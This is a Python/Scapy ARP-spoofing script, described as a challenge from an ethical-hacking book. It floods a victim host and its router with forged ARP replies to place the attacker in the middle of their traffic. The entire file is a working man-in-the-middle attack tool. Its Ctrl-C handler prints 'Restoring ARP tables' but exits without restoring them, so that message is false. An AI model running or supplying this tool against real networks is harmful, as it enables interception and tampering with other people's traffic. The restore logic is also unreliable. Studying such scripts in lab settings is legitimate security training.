#/bin/python3
#This script is a challenge from "Ethical Hacking" book

from scapy.all import *
import sys
import signal

def exit(sig,frame):
    print("\n[!] Restoring ARP tables....")
    sys.exit(1)

signal.signal(signal.SIGINT, exit)

def arp_spoof(dest_ip, dest_mac, source_ip):
    #This is my code
    packet = ARP(op="who-has",hwdst=dest_mac,pdst=dest_ip,psrc=source_ip)
    send(packet,verbose=False)

def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
    packet= ARP(op="is-at", hwsrc=source_mac,
    psrc = source_ip, hwdst= dest_mac , pdst= dest_ip)
    send(packet, verbose=False)

def main():
    try:
        victim_ip = sys.argv[1]
        router_ip = sys.argv[2]
        victim_mac = getmacbyip(victim_ip)
        router_mac = getmacbyip(router_ip)

        try:
            print("[!] Sending spoofed ARP packets....")
            while True:
                arp_spoof(victim_ip, victim_mac, router_ip)
                arp_spoof(router_ip, router_mac, victim_ip)
        except KeyboardInterrupt:
            arp_restore(router_ip, router_mac, victim_ip, victim_mac)
            arp_restore(victim_ip, victim_mac, router_ip, router_mac)
    except IndexError:
        print("\n[!] Usage: sudo python3 arpSpoof.py <VICTIM_IP> <ROUTER_IP>")

main()
